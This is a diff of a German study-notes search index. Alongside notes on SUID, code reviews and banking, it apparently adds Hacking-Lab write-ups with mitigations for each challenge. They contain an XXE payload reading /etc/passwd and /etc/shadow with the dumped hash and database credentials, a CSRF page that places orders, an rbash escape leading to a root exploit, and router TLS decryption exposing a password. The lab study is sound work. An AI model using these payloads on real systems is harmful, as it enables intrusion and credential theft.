@@ -916,6 +916,26 @@
             "title": "Tipps f\u00fcr \u00dcbung"
         }, 
         {
+            "location": "/InfSi3/13_Server_Security/", 
+            "text": "Server Security\n\n\nSUID Flag\n\n\n\n\nNormalerweise hat ein Prozess, der von einem Binary erstellt wird, die Rechte des Aufrufers\n\n\nWenn auf dem Binary das Suid-Flag gesetzt wurde, werden Prozesse immer mit Recht des File-Owners erstellt, egal wer sie aufruft\n\n\nSetzen mit owner Rechten: \nchmod +s /usr/bin/passwd\n\n\nsiehe z.B. \nls -la /usr/bin/passwd\n\n\nMit der Shell k\u00f6nnen keine Scripts mit suid-Flag mit owner-Rechten ausgef\u00fchrt werden! Es braucht ein Binary (z.B. C-File compilen)\n\n\n\n\nTLS\n\n\n\n\nSSLHonorCipherOrder on\n setzen, damit der Server die akzeptierten Ciphers erzwingt", 
+            "title": "13 Server Security"
+        }, 
+        {
+            "location": "/InfSi3/13_Server_Security/#server-security", 
+            "text": "", 
+            "title": "Server Security"
+        }, 
+        {
+            "location": "/InfSi3/13_Server_Security/#suid-flag", 
+            "text": "Normalerweise hat ein Prozess, der von einem Binary erstellt wird, die Rechte des Aufrufers  Wenn auf dem Binary das Suid-Flag gesetzt wurde, werden Prozesse immer mit Recht des File-Owners erstellt, egal wer sie aufruft  Setzen mit owner Rechten:  chmod +s /usr/bin/passwd  siehe z.B.  ls -la /usr/bin/passwd  Mit der Shell k\u00f6nnen keine Scripts mit suid-Flag mit owner-Rechten ausgef\u00fchrt werden! Es braucht ein Binary (z.B. C-File compilen)", 
+            "title": "SUID Flag"
+        }, 
+        {
+            "location": "/InfSi3/13_Server_Security/#tls", 
+            "text": "SSLHonorCipherOrder on  setzen, damit der Server die akzeptierten Ciphers erzwingt", 
+            "title": "TLS"
+        }, 
+        {
             "location": "/InfSi3/1_Exam/", 
             "text": "Exam\n\n\n\n\nPr\u00fcfung ohne Unterlagen\n\n\nSelbststudium ist Pr\u00fcfungsstoff!", 
             "title": "1 Exam"
@@ -1131,6 +1151,31 @@
             "title": "Remediation"
         }, 
         {
+            "location": "/InfSi3/hacking-lab/2600_XML-Path-Traversal/", 
+            "text": "2600 Web Security: XML Path Traversal\n\n\nVorgehen\n\n\n\n\n\n\nDie Website schickt die Eingaben als XML-Dokument an den Server\n\n\n\n\n\n\n\nDie Antwort beinhaltet das \nquery\n-Objekt, das wir schicken\n\n\n\n\nMit einer XXE-Attacke k\u00f6nnen wir versuchen, ein File vom System in den Request zu schreiben, das bei der Antwort vom Server mitgeschickt wird:\n\n\n\n\n?xml version=\n1.0\n encoding=\nUTF-8\n ?\n\n\n!DOCTYPE query [\n!ENTITY getme SYSTEM \n/etc/passwd\n]\n\n\nquery\n\n    \nresult-limit\n1\n/result-limit\n\n    \nbell-name\nbla\n/bell-name\n\n    \nbell-description\ngetme;\n/bell-description\n\n\n/query\n\n\n\n\n\n\n\n\nAntwort:\n\n\n\n\n\n\n\n\nSo haben wir den Inhalt von \n/etc/passwd\n. Genau gleich k\u00f6nnen wir die anderen Files auslesen\n\n\n/etc/shadow\n\n\n\n\nroot:$1$HwRrL3RY$9lRscANn8FK46LdzJEoa9.:15988:0:99999:7:::\ndaemon:*:13035:0:99999:7:::\nbin:*:13035:0:99999:7:::\nsys:*:13035:0:99999:7:::\nsync:*:13035:0:99999:7:::\ngames:*:13035:0:99999:7:::\nman:*:13035:0:99999:7:::\nlp:*:13035:0:99999:7:::\nmail:*:13035:0:99999:7:::\nnews:*:13035:0:99999:7:::\nuucp:*:13035:0:99999:7:::\nproxy:*:13035:0:99999:7:::\n...\n\n\n\n\n\n\n\nDas Root-Verzeichnis \n/\n:\n\n\n\n\nbin\nboot\ncdrom\ndev\netc\nhome\ninitrd\ninitrd.img\nlib\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nsbin\nselinux\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz\n\n\n\n\n\n\n\nInhalt von \n/opt/applic\n\n\n\n\n...\nmyca\nmysql\nmysql_old\nmysql-5.0.51a\nmysql-standard-4.0.26-pc-linux-gnu-i686\n...\ntomcat\nvmware\n\n\n\n\n\n\n\nInhalt von \n/opt/applic/tomcat/webapps.properties/\n\n\n\n\n...\nmail.properties\nmysql.hr.properties\nmysql.properties\n...\n\n\n\n\n\n\n\nInhalt von \n/opt/applic/tomcat/webapps.properties/mysql.properties\n\n\n\n\n# MYSQL PROPERTIES - TIME IN SECONDS\n################################################################\nmysql.driver        = org.gjt.mm.mysql.Driver\n\nmysql.username      = glockenemil\nmysql.password      = Nt88,.po\n\nmysql.bells.url     = jdbc:mysql://127.0.0.1:5506/glocken_emil?autoDeserialize=true\nmysql.login.url     = jdbc:mysql://127.0.0.1:5506/login\nmysql.session.url   = jdbc:mysql://127.0.0.1:5506/sessionservice\n\nmysql.session.testquery =\nmysql.login.testquery   =\nmysql.bells.testquery   =\n\nmysql.connections.max               = 100 \nmysql.connections.min               = 10 \nmysql.connections.increaserate      = 2 \nmysql.connections.timeout           = 120\nmysql.connections.maxage            = 900\n\n\n# LOGIN TABLE DEFS\n#################################################################\nmysql.tblLogin      = users\n\nmysql.fldAdditionalTime = additionaltime\nmysql.fldReleaseTime    = releasetime\nmysql.fldUsername   = username\nmysql.fldTries      = tries\ncontactForm = no\n\n\n\n\n\n\n\nSo haben wir die Credentials vom SQL-Benutzer gefunden, womit der Tomcat connected: \nglockenemil\n, \nNt88,.po\n\n\n\n\nSecurity Problem\n\n\n\n\nDer Server spielt hier XML-Generator: Er liest unsere DTD-Definition und sucht auf dem Filesystem nach dem Namen (z.B. \n/etc/shadow\n), was eigentlich eine DTD-Definition sein sollte. Das XML wird an uns zur\u00fcck gegeben mit dem Inhalt der Datei\n\n\nDer Prozess des Webservers scheint Lesezugriff auf das gesamte System zu haben\n\n\n\n\nMitigation\n\n\n\n\nRechte des Server-Prozesses einschr\u00e4nken, dass er nur Lese-Zugriff auf das n\u00f6tigste hat\n\n\nXML-Parser konfigurieren, dass nicht eine beliebige Datei, sondern nur valide XML-Schemata eingelesen wird\n\n\nz.B. mit einer WAF solche Entity Injections komplett heraus filtern / blockieren", 
+            "title": "2600 XML Path Traversal"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2600_XML-Path-Traversal/#2600-web-security-xml-path-traversal", 
+            "text": "", 
+            "title": "2600 Web Security: XML Path Traversal"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2600_XML-Path-Traversal/#vorgehen", 
+            "text": "Die Website schickt die Eingaben als XML-Dokument an den Server    Die Antwort beinhaltet das  query -Objekt, das wir schicken   Mit einer XXE-Attacke k\u00f6nnen wir versuchen, ein File vom System in den Request zu schreiben, das bei der Antwort vom Server mitgeschickt wird:   ?xml version= 1.0  encoding= UTF-8  ?  !DOCTYPE query [ !ENTITY getme SYSTEM  /etc/passwd ]  query \n     result-limit 1 /result-limit \n     bell-name bla /bell-name \n     bell-description getme; /bell-description  /query    Antwort:     So haben wir den Inhalt von  /etc/passwd . Genau gleich k\u00f6nnen wir die anderen Files auslesen  /etc/shadow   root:$1$HwRrL3RY$9lRscANn8FK46LdzJEoa9.:15988:0:99999:7:::\ndaemon:*:13035:0:99999:7:::\nbin:*:13035:0:99999:7:::\nsys:*:13035:0:99999:7:::\nsync:*:13035:0:99999:7:::\ngames:*:13035:0:99999:7:::\nman:*:13035:0:99999:7:::\nlp:*:13035:0:99999:7:::\nmail:*:13035:0:99999:7:::\nnews:*:13035:0:99999:7:::\nuucp:*:13035:0:99999:7:::\nproxy:*:13035:0:99999:7:::\n...   Das Root-Verzeichnis  / :   bin\nboot\ncdrom\ndev\netc\nhome\ninitrd\ninitrd.img\nlib\nlost+found\nmedia\nmnt\nopt\nproc\nroot\nsbin\nselinux\nsrv\nsys\ntmp\nusr\nvar\nvmlinuz   Inhalt von  /opt/applic   ...\nmyca\nmysql\nmysql_old\nmysql-5.0.51a\nmysql-standard-4.0.26-pc-linux-gnu-i686\n...\ntomcat\nvmware   Inhalt von  /opt/applic/tomcat/webapps.properties/   ...\nmail.properties\nmysql.hr.properties\nmysql.properties\n...   Inhalt von  /opt/applic/tomcat/webapps.properties/mysql.properties   # MYSQL PROPERTIES - TIME IN SECONDS\n################################################################\nmysql.driver        = org.gjt.mm.mysql.Driver\n\nmysql.username      = glockenemil\nmysql.password      = Nt88,.po\n\nmysql.bells.url     = jdbc:mysql://127.0.0.1:5506/glocken_emil?autoDeserialize=true\nmysql.login.url     = jdbc:mysql://127.0.0.1:5506/login\nmysql.session.url   = jdbc:mysql://127.0.0.1:5506/sessionservice\n\nmysql.session.testquery =\nmysql.login.testquery   =\nmysql.bells.testquery   =\n\nmysql.connections.max               = 100 \nmysql.connections.min               = 10 \nmysql.connections.increaserate      = 2 \nmysql.connections.timeout           = 120\nmysql.connections.maxage            = 900\n\n\n# LOGIN TABLE DEFS\n#################################################################\nmysql.tblLogin      = users\n\nmysql.fldAdditionalTime = additionaltime\nmysql.fldReleaseTime    = releasetime\nmysql.fldUsername   = username\nmysql.fldTries      = tries\ncontactForm = no   So haben wir die Credentials vom SQL-Benutzer gefunden, womit der Tomcat connected:  glockenemil ,  Nt88,.po", 
+            "title": "Vorgehen"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2600_XML-Path-Traversal/#security-problem", 
+            "text": "Der Server spielt hier XML-Generator: Er liest unsere DTD-Definition und sucht auf dem Filesystem nach dem Namen (z.B.  /etc/shadow ), was eigentlich eine DTD-Definition sein sollte. Das XML wird an uns zur\u00fcck gegeben mit dem Inhalt der Datei  Der Prozess des Webservers scheint Lesezugriff auf das gesamte System zu haben", 
+            "title": "Security Problem"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/2600_XML-Path-Traversal/#mitigation", 
+            "text": "Rechte des Server-Prozesses einschr\u00e4nken, dass er nur Lese-Zugriff auf das n\u00f6tigste hat  XML-Parser konfigurieren, dass nicht eine beliebige Datei, sondern nur valide XML-Schemata eingelesen wird  z.B. mit einer WAF solche Entity Injections komplett heraus filtern / blockieren", 
+            "title": "Mitigation"
+        }, 
+        {
             "location": "/InfSi3/hacking-lab/2651_CSRF/", 
             "text": "2651 Cross Site Request Forgery\n\n\nAnalyse\n\n\n\n\nRequests mit eingeloggtem User per ZAP Proxy abfangen\n\n\nDas Hinzuf\u00fcgen zum Warenkorb geschieht mit GET und Query-Parameter\n\n\n\n\nGET http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=10\nSubmit=Order\n\n\n\n\n\n\n\nBeim Absenden der Bestellung wird ein GET auf \n\n\n\n\n http://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n\n\n\n\n\nausgef\u00fchrt\n\n\nExploit\n\n\nAuf der Landing Page erstellen wir eine HTML-Seite, damit der Browser per \nimg\n-Tag die beiden GET-Requests ausf\u00fchrt\n\n\nhtml\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\n\n\nDies funktioniert aber nicht richtig, da die beiden Bilder parallel geladen werden. Zuerst muss der erste Request abgeschlossen sein, bis der zweite beginnen kann\n\n\n\n\nhtml\n\n\nhead\n\n\nscript\n \ntype\n=\ntext/javascript\n\n    \nvar\n \nloadSecond\n \n=\n \nfunction\n()\n \n{\n\n        \ndocument\n.\nlocation\n=\norder.html\n;\n\n    \n}\n\n    \nvar\n \nimg\n \n=\n \ndocument\n.\nimages\n[\n0\n];\n\n    \nimg\n.\naddEventListener\n(\nload\n,\n \nloadSecond\n,\n \nfalse\n);\n\n\n/\nscript\n\n\n/\nhead\n\n\nbody\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=addproduct\nproductId=2\nquantity=20\nSubmit=Order\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\nimg\n \nsrc\n=\nhttp://glocken.hacking-lab.com/12001/cookie_case0/cookie0/controller?action=executeCreditCardOrder\n \nheight\n=\n1\n \nwidth\n=\n1\n/\n\n\n/\nbody", 
             "title": "2651 CSRF"
@@ -1231,6 +1276,16 @@
             "title": "4252 DIVA App: M2 Unintended Data Leakage"
         }, 
         {
+            "location": "/InfSi3/hacking-lab/5102_Wireshark_SSL/", 
+            "text": "5102 Wireshark Decode SSL Traffic\n\n\n\n\nCNC Server dient als Proxy des Opfers\n\n\nOpfer schickt messages an CNC mit base64-encodeten messages, im Dump username + password\n\n\nOpfer geht auf yahoo.com\n\n\nDas Login wird vom Proxy h\u00f6chst wahrscheinlich durchgeleitet\n\n\nDie folgenden Requests nach dem Login gehen aber nicht mehr \u00fcber HTTPS, der Browser des Opfers schickt jeweils das Session-Cookie mit, das nun der Angreifer problemlos auslesen und selbst benutzen kann", 
+            "title": "5102 Wireshark SSL"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/5102_Wireshark_SSL/#5102-wireshark-decode-ssl-traffic", 
+            "text": "CNC Server dient als Proxy des Opfers  Opfer schickt messages an CNC mit base64-encodeten messages, im Dump username + password  Opfer geht auf yahoo.com  Das Login wird vom Proxy h\u00f6chst wahrscheinlich durchgeleitet  Die folgenden Requests nach dem Login gehen aber nicht mehr \u00fcber HTTPS, der Browser des Opfers schickt jeweils das Session-Cookie mit, das nun der Angreifer problemlos auslesen und selbst benutzen kann", 
+            "title": "5102 Wireshark Decode SSL Traffic"
+        }, 
+        {
             "location": "/InfSi3/hacking-lab/7002_GotRoot/", 
             "text": "7002 Got Root\n\n\nAnalyse\n\n\n\n\nMit dem \nrestricted\n User ist man in einer Shell gefangen, \ncat\n zum Beispiel funktioniert nicht:\n\n\n\n\n-rbash: /usr/bin/python: restricted: cannot specify `/\n in command names\n\n\n\n\n\n\n\nOffensichtlich ist man in einer \nrbash\n. Im \"home\"-Verzeichnis liegt folgendes:\n\n\n\n\n$ ls -la\ndrwx------ \n3\n restricted users \n4096\n \n2012\n-04-12 \n12\n:43 .\ndrwxr-xr-x \n6\n root       root  \n4096\n \n2008\n-11-13 \n16\n:54 ..\n-rw------- \n1\n restricted users  \n883\n \n2012\n-04-12 \n12\n:52 .bash_history\n-rw-r--r-- \n1\n restricted users   \n39\n \n2007\n-09-12 \n12\n:27 .bashrc\ndr-xr-xr-x \n2\n root       root  \n4096\n \n2007\n-09-12 \n11\n:50 bin\nlrwxrwxrwx \n1\n root       root     \n7\n \n2008\n-11-13 \n10\n:18 .profile -\n .bashrc\n\n\n\n\n\n\n\nMit \nls -la bin/\n sehen wir, dass wir \ntee\n, \nls\n und \nping\n ausf\u00fchren k\u00f6nnen\n\n\nDie \n.bashrc\n wird bei jedem Login ausgef\u00fchrt, und als \nrestricted\n User haben wir Schreibrechte drauf\n\n\n\n\nExploit\n\n\n\n\nMit \ntee\n k\u00f6nnen wir die \n.bashrc\n \u00fcberschreiben\n\n\n\n\necho\n \n/bin/sh\n \n|\n tee .bashrc\n\n\n\n\n\n\n\nWenn wir jetzt eine sepparate SSH-Session aufmachen, wird \n/bin/sh\n ausgef\u00fchrt, und wir sind in einer normalen Shell\n\n\nVon do k\u00f6nnen wir den Exploit von \nhttp://www.exploit-db.com/exploits/18105/\n benutzen\n\n\ncat \n exploit.sh \n EOF\n\n\nExploit einf\u00fcgen\n\n\nEOF\n\n\nchmod +x exploit.sh\n\n\n./exploit.sh\n\n\n\n\n\n\n\n\n\n(im Bild heisst der exploit \nnothing.sh\n und wurde schon in der rbash hinein kopiert)\n\n\nsecret.txt:\n\n\nTEAM X GOTROOT\n\nID: GOTROOT\n\n____________________________________________________________\nJe unschuldiger ein M\u00e4dchen ist, desto weniger weiss sie\nvon den Methoden der Verf\u00fchrung. Bevor sie Zeit hat nachzu-\ndenken, zieht Begehren sie an, Neugier noch mehr und Gelegen-\nheit macht den Rest...\n(Casanova)\n\nI love you all \nE1\n\n\n\n\n\nRemediation\n\n\n\n\nDas File \n.bashrc\n muss zwar vom \nrestricted\n User ausgef\u00fchrt werden k\u00f6nnen, er braucht aber keine Schreibberechtigung darauf. Eine Berechtigung von \n400\n w\u00fcrde reichen, dann k\u00f6nnte er die Datei nicht mehr \u00fcberschreiben\n\n\nNat\u00fcrlich ist dieser Exploit nur mit einer alten Version von \nglibc\n m\u00f6glich", 
             "title": "7002 GotRoot"
@@ -1254,6 +1309,36 @@
             "location": "/InfSi3/hacking-lab/7002_GotRoot/#remediation", 
             "text": "Das File  .bashrc  muss zwar vom  restricted  User ausgef\u00fchrt werden k\u00f6nnen, er braucht aber keine Schreibberechtigung darauf. Eine Berechtigung von  400  w\u00fcrde reichen, dann k\u00f6nnte er die Datei nicht mehr \u00fcberschreiben  Nat\u00fcrlich ist dieser Exploit nur mit einer alten Version von  glibc  m\u00f6glich", 
             "title": "Remediation"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/", 
+            "text": "7030 Linksys SSL Break\n\n\nVorgehen\n\n\n\n\nZertifikat mit littleblackbox (\nhttps://code.google.com/archive/p/littleblackbox/downloads\n) finden:\n\n\n\n\n./littleblackbox -f 44:59:E1:9D:11:C0:3F:3F:17:FC:15:6F:FA:5C:EA:5A:F2:6C:4F:80 -k\n\n\n\n\n\n\n\n\n\nDamit bekommen wir ein Zertifikat, das wir im Wireshark (wie bei 5102) importieren k\u00f6nnen. Dabei ist es egal, auf welche IP es gesetzt wird (\n192.168.200.242\n oder \n192.168.200.55\n)\n\n\n\n\n\n\nAb dem zweiten GET-Request (wahrscheinlich nach dem Login) wird in jedem Request einen \nAuthorization\n HTTP-Header mitgeschickt (Basic Authentication). Dort k\u00f6nnen wir User und passwort in der form \nuser:password\n auslesen:\n\n\n\n\n\n\n\n\n\n\nDer User ist leer, also wird wahrscheinlich nur das Passwort \n1337password\n ben\u00f6tigt\n\n\n\n\nSecurity Questions\n\n\nIn this challenge, you have deciphered TLS/SSL traffic; Explain why this is possible!\n\n\nDer Router, der hier HTTP-Server spielt, braucht ein TLS-Zertifikat um mit den Browsern verschl\u00fcsselt zu kommunizieren. Dabei muss der Private-Key des Zertifikats irgendwo auf dem Ger\u00e4t liegen. Hersteller verwenden oft f\u00fcr alle Ger\u00e4te das gleiche Zertifikat, damit sie nur ein einziges von einer CA signieren m\u00fcssen. Wenn nun aber jemand den Private Key auf dem Router findet, k\u00f6nen TLS-Sessions entschl\u00fcsselt werden\n\n\nExplain mitigation\n\n\n\n\nMit \"Perfect Forward Secrecy\" (Diffie-Hellman) k\u00f6nnten vergangene Sessions nicht mehr entschl\u00fcsselt werden. Trotzdem ist das Zertifikat noch kompromitiert, das Problem l\u00f6st es also nicht.\n\n\nDer Private Key des Zertifikats sollte in einem sicheren Hardware-Modul verbaut werden. Das macht es viel schwieriger, den Private Key rauszufinden, es bietet aber noch immer eine Angriffsfl\u00e4che\n\n\nDer Hersteller sollte bei jedem Ger\u00e4t einmalig ein Zertifikat generieren. Es kann auch self-signed sein, der User muss dann daf\u00fcr einfach dem Zertifikat einmalig vertrauen", 
+            "title": "7030 LinkSys SSL Break"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/#7030-linksys-ssl-break", 
+            "text": "", 
+            "title": "7030 Linksys SSL Break"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/#vorgehen", 
+            "text": "Zertifikat mit littleblackbox ( https://code.google.com/archive/p/littleblackbox/downloads ) finden:   ./littleblackbox -f 44:59:E1:9D:11:C0:3F:3F:17:FC:15:6F:FA:5C:EA:5A:F2:6C:4F:80 -k    Damit bekommen wir ein Zertifikat, das wir im Wireshark (wie bei 5102) importieren k\u00f6nnen. Dabei ist es egal, auf welche IP es gesetzt wird ( 192.168.200.242  oder  192.168.200.55 )    Ab dem zweiten GET-Request (wahrscheinlich nach dem Login) wird in jedem Request einen  Authorization  HTTP-Header mitgeschickt (Basic Authentication). Dort k\u00f6nnen wir User und passwort in der form  user:password  auslesen:      Der User ist leer, also wird wahrscheinlich nur das Passwort  1337password  ben\u00f6tigt", 
+            "title": "Vorgehen"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/#security-questions", 
+            "text": "", 
+            "title": "Security Questions"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/#in-this-challenge-you-have-deciphered-tlsssl-traffic-explain-why-this-is-possible", 
+            "text": "Der Router, der hier HTTP-Server spielt, braucht ein TLS-Zertifikat um mit den Browsern verschl\u00fcsselt zu kommunizieren. Dabei muss der Private-Key des Zertifikats irgendwo auf dem Ger\u00e4t liegen. Hersteller verwenden oft f\u00fcr alle Ger\u00e4te das gleiche Zertifikat, damit sie nur ein einziges von einer CA signieren m\u00fcssen. Wenn nun aber jemand den Private Key auf dem Router findet, k\u00f6nen TLS-Sessions entschl\u00fcsselt werden", 
+            "title": "In this challenge, you have deciphered TLS/SSL traffic; Explain why this is possible!"
+        }, 
+        {
+            "location": "/InfSi3/hacking-lab/7030_LinkSys_SSL_Break/#explain-mitigation", 
+            "text": "Mit \"Perfect Forward Secrecy\" (Diffie-Hellman) k\u00f6nnten vergangene Sessions nicht mehr entschl\u00fcsselt werden. Trotzdem ist das Zertifikat noch kompromitiert, das Problem l\u00f6st es also nicht.  Der Private Key des Zertifikats sollte in einem sicheren Hardware-Modul verbaut werden. Das macht es viel schwieriger, den Private Key rauszufinden, es bietet aber noch immer eine Angriffsfl\u00e4che  Der Hersteller sollte bei jedem Ger\u00e4t einmalig ein Zertifikat generieren. Es kann auch self-signed sein, der User muss dann daf\u00fcr einfach dem Zertifikat einmalig vertrauen", 
+            "title": "Explain mitigation"
         }, 
         {
             "location": "/ParProg/0_Index/", 
@@ -1816,6 +1901,16 @@
             "title": "Software Engineering 2"
         }, 
         {
+            "location": "/SE2/10_Performance-Messungen/", 
+            "text": "Performance Messungen\n\n\n\n\nZuerst messen, dann Optimierung versuchen\n\n\nsequentiell ist nicht immer langsamer als parallel!\n\n\n\n\n\n\nMit Profiler messen, welche Methodenaufrufe am langsamsten sind\n\n\nJVM kann mit einem Profiler auch im Betrieb beobachtet werden\n\n\nLast-Messungen z.B. mit Gatling\n\n\nDaf\u00fcr m\u00f6glichst realistische Szenarien entwerfen, auch caching beachten!", 
+            "title": "10 Performance Messungen"
+        }, 
+        {
+            "location": "/SE2/10_Performance-Messungen/#performance-messungen", 
+            "text": "Zuerst messen, dann Optimierung versuchen  sequentiell ist nicht immer langsamer als parallel!    Mit Profiler messen, welche Methodenaufrufe am langsamsten sind  JVM kann mit einem Profiler auch im Betrieb beobachtet werden  Last-Messungen z.B. mit Gatling  Daf\u00fcr m\u00f6glichst realistische Szenarien entwerfen, auch caching beachten!", 
+            "title": "Performance Messungen"
+        }, 
+        {
             "location": "/SE2/1_Exam/", 
             "text": "Some exam notes...", 
             "title": "1 Exam"
@@ -2094,6 +2189,21 @@
             "location": "/SE2/8_Metriken/#metriken", 
             "text": "", 
             "title": "Metriken"
+        }, 
+        {
+            "location": "/SE2/9_Code_Reviews/", 
+            "text": "Code Reviews\n\n\n\n\nMehr als zwei Personen aus der eigenen Abteilung\n\n\nDefinierte Rollen\n\n\nProtokollieren, z.B. n\u00f6tige Nacharbeiten\n\n\nevtl. einordnen nach Schweregrad\n\n\n\n\n\n\nVorher St\u00fcck Code f\u00fcr Review ausw\u00e4hlen, ~500 LOC f\u00fcr 2h Review\n\n\nAuch Unit Tests anschauen!\n\n\nAuf die Fehlerfindung konzentrieren, weniger auf L\u00f6sungsvorschl\u00e4ge\n\n\n\n\nWorauf achten\n\n\n\n\nVerst\u00e4ndlichkeit\n\n\nNamenswahl\n\n\nCode Smells\n\n\n\u00dcbereinstimmung mit Architektur-Ideen", 
+            "title": "9 Code Reviews"
+        }, 
+        {
+            "location": "/SE2/9_Code_Reviews/#code-reviews", 
+            "text": "Mehr als zwei Personen aus der eigenen Abteilung  Definierte Rollen  Protokollieren, z.B. n\u00f6tige Nacharbeiten  evtl. einordnen nach Schweregrad    Vorher St\u00fcck Code f\u00fcr Review ausw\u00e4hlen, ~500 LOC f\u00fcr 2h Review  Auch Unit Tests anschauen!  Auf die Fehlerfindung konzentrieren, weniger auf L\u00f6sungsvorschl\u00e4ge", 
+            "title": "Code Reviews"
+        }, 
+        {
+            "location": "/SE2/9_Code_Reviews/#worauf-achten", 
+            "text": "Verst\u00e4ndlichkeit  Namenswahl  Code Smells  \u00dcbereinstimmung mit Architektur-Ideen", 
+            "title": "Worauf achten"
         }, 
         {
             "location": "/Vss/0_Index/", 
@@ -2604,6 +2714,56 @@
             "location": "/Vwl/10_Staatsfinanzen/#staatsverschuldung-in-der-schweiz", 
             "text": "Nimmt seit 2003 ab  2001 Schuldenbrems-Initiative (-  Auf Verfassungsebene)  Schulden d\u00fcrfen nur im Umfangs des BIPs steigen", 
             "title": "Staatsverschuldung in der Schweiz"
+        }, 
+        {
+            "location": "/Vwl/11_Banken/", 
+            "text": "Banken\n\n\nRollen der Banken\n\n\n\n\nUnternehmen k\u00f6nnen von der Bank (indirekt) oder durch Aktien und Obligationen finanziert werden\n\n\nBank k\u00f6nnen langfristige Kredite anbieten, im Gegensatz zu Haushalten, die nur f\u00fcr kurze Zeit sparen wollen (Fristentransformation)\n\n\nMit Finanzierung der Bank wird das Risiko verteilt, Kreditausf\u00e4lle werden von Banken abgefedert\n\n\nBanken haben wenig Eigenkapital, die meisten Passiven sind Fremdkapital (ca. 98%)\n\n\nJe gr\u00f6sser das Eigenkapital, desto weniger Kredite k\u00f6nnen sie vergeben\n\n\nNur: Eigenkapital darf nicht 0 sein (sonst Unternehmen konkurs)\n\n\nBanken d\u00fcrfen also nicht viel Verluste machen (Solvenzrisiko)\n\n\n\n\n\n\n\n\nBankgesch\u00e4ft\n\n\n\n\nKreditvergabe (Zinsdifferenzgesch\u00e4ft)\n\n\nVerluste nur, wenn Kredite nicht mehr zur\u00fcck gezahlt werden k\u00f6nnen\n\n\n\n\n\n\nKommissionsgesch\u00e4ft: z.B. Verm\u00f6gensverwaltung (niedriges Risiko)\n\n\nEigenhandel: Hohes Risiko\n\n\nMit Einlagen, noch h\u00f6heres Risiko mit reinem Fremdkapital\n\n\n\n\n\n\nRisiken:\n\n\nSolvenzrisiko durch Kreditvergabe\n\n\nLiquidit\u00e4tsrisiko (Haushalte wollen Geld zur\u00fcck, \"Bank Run\")\n\n\n\n\n\n\n\n\nBankenregulierung\n\n\n\n\nMikroprudentielle Regulierung: Stabilit\u00e4t einzelner Banken\n\n\nMakgroprudentielle Regulierung: Stabilit\u00e4t des ganzen Bankensystems (z.B. SNB)\n\n\nBanken sollen ein bestimmtes Eigenkapital und Liquidit\u00e4t haben\n\n\nVorschriften zur Konkursabwicklung\n\n\nMomentan ist mit der Regulierung \"Basel II\" 8% Eigenkapital nach Risiko gewichtet gefordert\n\n\nBis 2019 soll dieser bis 13% erh\u00f6ht werden\n\n\nUm EK zu erh\u00f6hen, kann Bank weniger Kredite herausgeben oder z.B. Aktien verkaufen\n\n\nObligatorische Einlageversicherung\n: Der Kunde kann garantiert seinen Betrag bis zu einer Obergrenze liquidieren\n\n\nSoll Bank-Run verhindern\n\n\n\n\n\n\nUm Liquidit\u00e4tsvorgaben einzuhalten, haben sich bis 2008 Banken gegenseitig Liquide Mittel ausgeliehen (Interbank-Gesch\u00e4ft)\n\n\nGef\u00e4hrlich, bei einem Bank-Run w\u00fcrde Bank A von Bank B Liquidit\u00e4t ausleihen, womit nun Bank B ein Problem hat, usw...\n\n\nDies ist 2008 auch passiert\n\n\nSeit 2008 sind Banken abh\u00e4ngig von Zentralbanken f\u00fcr Liquidit\u00e4t\n\n\n\n\n\n\n\"Too big to fail\": Banken d\u00fcrfen nicht konkurs gehen, weil sie sonst grosse Teile der Wirtschaft mit in den Abgrund reissen w\u00fcrden\n\n\nL\u00f6sungsans\u00e4tze: Verhinderhung der Insolvenz mit h\u00f6heren Eigenkapitalforderungen\n\n\n\"Living Will\": Organisationsform, welche Erlaubt, einzelne noch funktionsf\u00e4hige Gesch\u00e4ftsbereiche rasch abzuspalten (siehe UBS, CS)", 
+            "title": "11 Banken"
+        }, 
+        {
+            "location": "/Vwl/11_Banken/#banken", 
+            "text": "", 
+            "title": "Banken"
+        }, 
+        {
+            "location": "/Vwl/11_Banken/#rollen-der-banken", 
+            "text": "Unternehmen k\u00f6nnen von der Bank (indirekt) oder durch Aktien und Obligationen finanziert werden  Bank k\u00f6nnen langfristige Kredite anbieten, im Gegensatz zu Haushalten, die nur f\u00fcr kurze Zeit sparen wollen (Fristentransformation)  Mit Finanzierung der Bank wird das Risiko verteilt, Kreditausf\u00e4lle werden von Banken abgefedert  Banken haben wenig Eigenkapital, die meisten Passiven sind Fremdkapital (ca. 98%)  Je gr\u00f6sser das Eigenkapital, desto weniger Kredite k\u00f6nnen sie vergeben  Nur: Eigenkapital darf nicht 0 sein (sonst Unternehmen konkurs)  Banken d\u00fcrfen also nicht viel Verluste machen (Solvenzrisiko)", 
+            "title": "Rollen der Banken"
+        }, 
+        {
+            "location": "/Vwl/11_Banken/#bankgeschaft", 
